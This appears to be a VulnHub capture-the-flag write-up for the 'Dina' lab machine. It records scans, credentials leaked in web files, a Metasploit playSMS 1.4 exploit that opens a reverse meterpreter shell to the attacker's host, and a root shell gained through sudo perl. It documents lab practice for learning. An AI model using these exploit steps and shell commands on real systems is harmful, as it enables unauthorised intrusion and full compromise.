Dina

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Exploiting playSMS
[+] Privilege Escalation abusing SUDO right  = /usr/bin/perl
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-09 09:12 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00050s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Dina
MAC Address: 08:00:27:3A:EC:D6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct  9 09:15:06 2019
URL_BASE: http://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/cgi-bin/ (CODE:403|SIZE:290)                           
+ http://192.168.56.101/index (CODE:200|SIZE:3618)                             
+ http://192.168.56.101/index.html (CODE:200|SIZE:3618)                        
+ http://192.168.56.101/robots (CODE:200|SIZE:102)                             
+ http://192.168.56.101/robots.txt (CODE:200|SIZE:102)                         
==> DIRECTORY: http://192.168.56.101/secure/                                   
+ http://192.168.56.101/server-status (CODE:403|SIZE:295)                      
==> DIRECTORY: http://192.168.56.101/tmp/                                      
==> DIRECTORY: http://192.168.56.101/uploads/                                  
                                                                               
---- Entering directory: http://192.168.56.101/secure/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.101/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.101/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting the passwords

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.101/nothing/
<html>
<head><title>404 NOT FOUND</title></head>
<body>
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
<h1>NOT FOUND</html>
<h3>go back</h3>
</body>
</html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting a Backup.zip file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.101/secure/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /secure</title>
 </head>
 <body>
<h1>Index of /secure</h1>
<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[DIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="backup.zip">backup.zip</a></td><td align="right">17-Oct-2017 18:59  </td><td align="right">336 </td><td>&nbsp;</td></tr>
<tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.2.22 (Ubuntu) Server at 192.168.56.101 Port 80</address>
</body></html>

root@setrus:~# wget http://192.168.56.101/secure/backup.zip
--2019-10-09 10:04:16--  http://192.168.56.101/secure/backup.zip
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 336 [application/zip]
Saving to: ‘backup.zip’

backup.zip          100%[===================>]     336  --.-KB/s    in 0s      

2019-10-09 10:04:16 (22.9 MB/s) - ‘backup.zip’ saved [336/336]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Unzipping the zip with the password freedom


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat backup-cred.mp3 

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******


url : /SecreTSMSgatwayLoginr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://192.168.56.101/SecreTSMSgatwayLogin we find a playsms application

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Dina/dina1.png)

From the credentials we found we were able to login using the username :  touhid and password : diana

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Dina/dina2.png)

Searching for exploits

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# searchsploit playsms
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                  | exploits/php/remote/44598.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                  | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                    | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                              | exploits/php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                                                                                                                 | exploits/php/webapps/42038.txt
PlaySms 0.7 - SQL Injection                                                                                                                                         | exploits/linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                      | exploits/php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                               | exploits/php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                             | exploits/php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                        | exploits/php/webapps/30177.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are using 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                              | exploits/php/remote/44599.rb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Gaining Shell on the box:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > search playsms

Matching Modules
================

   Name                                       Disclosure Date  Rank       Check  Description
   ----                                       ---------------  ----       -----  -----------
   exploit/multi/http/playsms_filename_exec   2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution
   exploit/multi/http/playsms_uploadcsv_exec  2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution


msf5 > use exploit/multi/http/playsms_filename_exec
msf5 exploit(multi/http/playsms_filename_exec) > show options

Module options (exploit/multi/http/playsms_filename_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4


msf5 exploit(multi/http/playsms_filename_exec) > set password diana
password => diana
msf5 exploit(multi/http/playsms_filename_exec) > set username touhid
username => touhid
msf5 exploit(multi/http/playsms_filename_exec) > set rhosts 192.168.56.101
rhosts => 192.168.56.101
msf5 exploit(multi/http/playsms_filename_exec) > set targeturi /SecreTSMSgatwayLogin
targeturi => /SecreTSMSgatwayLogin
msf5 exploit(multi/http/playsms_filename_exec) > set lhost 192.168.56.102
lhost => 192.168.56.102
msf5 exploit(multi/http/playsms_filename_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[+] Authentication successful : [ touhid : diana ]
[*] Sending stage (38247 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:49080) at 2019-10-09 09:36:42 -0400

meterpreter > shell
Process 1615 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@Dina:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getting root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@Dina:/var/www/SecreTSMSgatwayLogin$ sudo -l
sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
www-data@Dina:/var/www/SecreTSMSgatwayLogin$ sudo /usr/bin/perl -e "exec '/bin/sh'"
<eTSMSgatwayLogin$ sudo /usr/bin/perl -e "exec '/bin/sh'"                    
# id
id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




